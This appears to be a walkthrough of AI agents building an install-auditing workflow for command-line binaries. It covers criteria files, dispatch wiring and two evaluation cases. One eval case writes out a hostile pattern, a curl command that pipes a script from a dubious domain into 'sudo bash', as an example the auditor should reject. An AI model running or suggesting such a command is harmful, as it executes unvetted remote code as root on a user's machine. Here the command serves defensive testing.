# Walkthrough: CLI Binary Workflow M4.2

> **Execution Date:** 2026-04-15
> **Completed By:** Claude (Opus 4.6 — orchestrator/closer) + Claude (Opus 4.6 — planner) + Claude (Sonnet 4.6 — executor)
> **Source Plan:** [2604151500-cli-binary-workflow-m42-plan.md](2604151500-cli-binary-workflow-m42-plan.md)
> **Duration:** Single orchestrated session (plan → execute → close)
> **Result:** Success

---

## Summary

Created Type 7 cli-binary workflow (`workflows/cli-binary.md`, 264 lines) and criteria addendum (`references/criteria/cli-binary.md`, 133 lines). Wired `SKILL.md` dispatch table row 7 and added 2 eval cases (ids 20, 21). All 7 success criteria passed. Second Phase 4 deliverable — CLI binaries no longer fall through to `workflows/generic.md`. Orchestration validated: opus subagent planned, sonnet subagent executed, orchestrator closed.

---

## Objectives Completion

| Objective | Status | Notes |
|-----------|--------|-------|
| Create `workflows/cli-binary.md` | Complete | 264 lines, 5 template sections (Identify / Evidence Part A / Evidence Part B / Subject Rubric / Subject Verdict Notes), cross-platform |
| Create `references/criteria/cli-binary.md` | Complete | 133 lines, 5 sections (channel trust, signature/checksum, install-script risk, provenance, tiers) |
| Wire SKILL.md dispatch row 7 | Complete | `generic.md` → `cli-binary.md` (Live — Phase 4 M4.2) |
| Add Type 7 evals | Complete | id 20 (ripgrep/Homebrew APPROVED), id 21 (curl-pipe-sudo-bash REJECTED) |
| Homebrew formulae boundary honored | Complete | `brew install <formula>` routes to cli-binary (confirmed in M4.1) |

---

## Execution Detail

### Step 1: Create `references/criteria/cli-binary.md`

**Planned:** New addendum with 5 sections covering distribution channel trust signals, signature/checksum standards, install-script risk classification, provenance assessment, tier thresholds.

**Actual:** Created as planned. 133 lines. 5 sections present: Distribution Channel Trust Signals (10-row table), Signature & Checksum Standards (8-row table), Install Script Risk Classification (7-row table), Provenance Assessment (6-row table), Tier Thresholds (Tier 1/2/3).

**Deviation:** None.

**Files Changed:**
| File | Change Type | Planned? | Details |
|------|-------------|----------|---------|
| `references/criteria/cli-binary.md` | Created | Yes | 133 lines, complete addendum |

**Verification:** File exists; all 5 sections present. Commit cdf4609.

---

### Step 2: Create `workflows/cli-binary.md`

**Planned:** Type 7 workflow following Identify / Evidence Part A / Evidence Part B / Subject Rubric / Subject Verdict Notes template.

**Actual:** Created as planned. 264 lines. Structure: HTML comment header → intro → Identify (3 sub-sections: distribution channel table with 8 channels, metadata extraction, required context checklist) → Evidence Part A (tier triage) → Evidence Part B (10 core research questions, distribution channel research guidance, checksum/signature verification procedure, incident research, 12-row audit coverage tracking table) → Subject Rubric (§4.1–4.6 cli-binary-specialized with checksum+signature as primary §4.1 axis) → Subject Verdict Notes (toward REJECTED/CONDITIONAL/APPROVED with concrete triggers).

**Deviation:** None.

**Files Changed:**
| File | Change Type | Planned? | Details |
|------|-------------|----------|---------|
| `workflows/cli-binary.md` | Created | Yes | 264 lines, all 5 template sections |

**Verification:** `grep "^## " workflows/cli-binary.md` confirms all required sections. Commit 49148a6.

---

### Step 3: Update `SKILL.md`

**Planned:** Dispatch table row 7 → `cli-binary.md`; add 2 Reference Files bullets in type-number order.

**Actual:** Executed as planned. Row 7 changed from `generic.md (Fallback)` to `cli-binary.md (Live — Phase 4 M4.2)`. Two Reference Files bullets inserted after the desktop-app entries.

**Deviation:** None.

**Files Changed:**
| File | Change Type | Planned? | Details |
|------|-------------|----------|---------|
| `SKILL.md` | Modified | Yes | Line 68: dispatch row 7 routing; Lines 218, 226: reference bullets |

**Verification:** `grep cli-binary SKILL.md` returns 4 hits (signal row 40, dispatch row 68, workflow bullet 218, addendum bullet 226). Commit 8c23815.

---

### Step 4: Update `evals/evals.json`

**Planned:** Append ids 20 (Tier 1 positive) and 21 (Tier 3 negative).

**Actual:** Appended id 20 (`brew install ripgrep`, Tier 1 APPROVED, 6 assertions) and id 21 (`curl -sSL https://totally-legit-tools.xyz/install.sh | sudo bash`, Tier 3 REJECTED, 7 assertions). JSON valid. Ids 0–19 unchanged.

**Deviation:** None.

**Files Changed:**
| File | Change Type | Planned? | Details |
|------|-------------|----------|---------|
| `evals/evals.json` | Modified | Yes | +29 lines; 2 entries appended; total 22 evals |

**Verification:** `node -e "const e=require('./evals/evals.json'); console.log(e.evals.length)"` → 22. ids 20, 21 confirmed present. Commit 34ddf0b.

---

## Complete Change Log

> **Derived from:** `git diff --stat master..HEAD`

### Files Created
| File | Purpose | Lines | In Plan? |
|------|---------|-------|----------|
| `workflows/cli-binary.md` | Type 7 subject workflow | 264 | Yes |
| `references/criteria/cli-binary.md` | Type 7 criteria addendum | 133 | Yes |
| `.projex/2604151500-cli-binary-workflow-m42-log.md` | Execution log | 58 | Implicit (execute-projex standard) |

### Files Modified
| File | Changes | Lines Affected | In Plan? |
|------|---------|----------------|----------|
| `SKILL.md` | Dispatch row 7 + 2 reference bullets | +2/-2 | Yes |
| `evals/evals.json` | Appended ids 20, 21 | +29 | Yes |
| `.projex/2604151500-cli-binary-workflow-m42-plan.md` | Status → Complete | +1/-1 | Implicit (execute-projex standard) |

### Files Deleted
None.

### Planned But Not Changed
None.

---

## Success Criteria Verification

| Criterion | Method | Result | Evidence |
|-----------|--------|--------|----------|
| Workflow follows 5-section template | `grep "^## " workflows/cli-binary.md` | PASS | Identify / Evidence — Part A / Evidence — Part B / Subject Rubric / Subject Verdict Notes |
| Criteria addendum has 5 sections | Read file; section scan | PASS | Distribution Channel Trust / Signature & Checksum / Install Script Risk / Provenance / Tier Thresholds |
| SKILL.md dispatch row 7 routes to cli-binary.md | `grep "cli-binary.md" SKILL.md` | PASS | Line 68: `\| 7 \| cli-binary \| workflows/cli-binary.md \| Live — Phase 4 (M4.2) \|` |
| SKILL.md reference files include workflow + addendum | `grep cli-binary SKILL.md` | PASS | 4 hits total (signal, dispatch, workflow ref, addendum ref) |
| evals.json gains ≥2 Type 7 cases | JSON parse + id check | PASS | ids 20 (Tier 1 ripgrep), 21 (Tier 3 curl-pipe-sudo-bash) |
| No regressions in ids 0–19 | Diff vs prior JSON | PASS | Confirmed by executor + plan file review |
| Homebrew formulae boundary wired | Workflow Identify table read | PASS | `brew install <name>` listed as Homebrew core formula channel |

**Overall:** 7/7 criteria passed.

---

## Deviations from Plan

None.

---

## Issues Encountered

None.

---

## Key Insights

### Lessons Learned

1. **Orchestration hand-off works when plan is concrete and context is minimal.**
   - Context: Opus planner produced a complete plan with exact file changes, rollback, and verification. Sonnet executor consumed it with no clarification rounds.
   - Application: For Phase 4 milestones M4.3–M4.5, the same plan-then-execute split should hold — the plan shape is now template-stable across M3.x + M4.x.

2. **Checksum+signature as primary §4.1 axis is the right abstraction for cli-binary.**
   - Context: M4.1 used code signing (Authenticode/notarization) as the primary desktop-app trust axis; M4.2 substitutes checksum+signature (GPG/Sigstore/Minisign/SLSA). Same slot, different cryptography.
   - Application: Workflow templates should name the "primary trust axis" as a slot, filled per-subject — keeps the rubric shape uniform while letting each type cite its native verification.

### Pattern Discoveries

1. **Phase 4 eval pattern: one Tier 1 well-known positive + one Tier 3 install-vector negative.**
   - Observed in: M4.1 (Firefox/winget ✓, fake VLC Pro ✗) and M4.2 (ripgrep/Homebrew ✓, curl-pipe-sudo-bash ✗).
   - Reuse potential: M4.3 (agent-extension) and M4.4 (remote-integration) can follow the same shape — one widely-adopted canonical subject, one implausible/malicious install channel.

### Gotchas / Pitfalls

1. **Install-script review scope needs a ceiling.**
   - Trap: "Read the script" is unbounded — any script can call another, fetch remote code, obfuscate.
   - Avoidance: Plan deliberately graduated script review by tier (Tier 1 excludes script-only; Tier 2 reviews if applicable; Tier 3 does full review). Red-flag list (sudo, obfuscation, unknown URLs, no checksum verification) bounds the review without demanding full static analysis.

### Technical Insights

- The standard workflow template (Identify / Evidence Part A / Evidence Part B / Subject Rubric / Subject Verdict Notes) has now been exercised across 7 subject types without structural modification — it is load-bearing but stable.
- The M0.3 "shared core + per-subject addendum" split keeps cross-cutting rules (tier-application, audit-coverage, §4.1/§4.2/§4.3/§4.5/§4.7 semantics) in `references/criteria.md` and per-subject scoring in `references/criteria/<subject>.md`. After 7 workflows, the split continues to hold without leakage.

---

## Recommendations

### Immediate Follow-ups
- [ ] M4.3 — `workflows/agent-extension.md` with three labeled sub-rubrics (8a MCP / 8b CC plugin / 8c CC skill)
- [ ] M4.4 — `workflows/remote-integration.md` (OAuth scopes, data residency, ToS, breach history)
- [ ] M4.5 — Phase 4 eval gate (≥1 case per long-tail workflow; M4.2 already has 2)

### Future Considerations
- Eval harness gap persists (Phase 6 cross-phase concern). Regression verification remains manual/JSON-only until a runner lands.
- Phase 5 (default-off generic) gets closer with each long-tail workflow.

### Plan Improvements
- Plan was well-scoped. No changes needed for M4.3–M4.5 to reuse the same shape.

---

## Related Projex Updates

### Documents to Update
| Document | Update Needed |
|----------|---------------|
| [2604151500-cli-binary-workflow-m42-plan.md](2604151500-cli-binary-workflow-m42-plan.md) | Status Complete + walkthrough link (done) |
| [2604070218-install-auditor-subject-typed-redesign-nav.md](../2604070218-install-auditor-subject-typed-redesign-nav.md) | Check M4.2 box; pivot current focus → M4.3 |

### New Projex Suggested
None — Phase 4 remaining milestones are already tracked in the nav.

---

## Appendix

### References
- Ephemeral branch: `projex/2604151500-cli-binary-workflow-m42`
- Commits: cdf4609 (addendum) → 49148a6 (workflow) → 8c23815 (SKILL.md) → 34ddf0b (evals) → 2b842c4 (complete marker) → walkthrough/move commit (this close) → squash merge
- Source plan committed at 80697b8 on master before execution
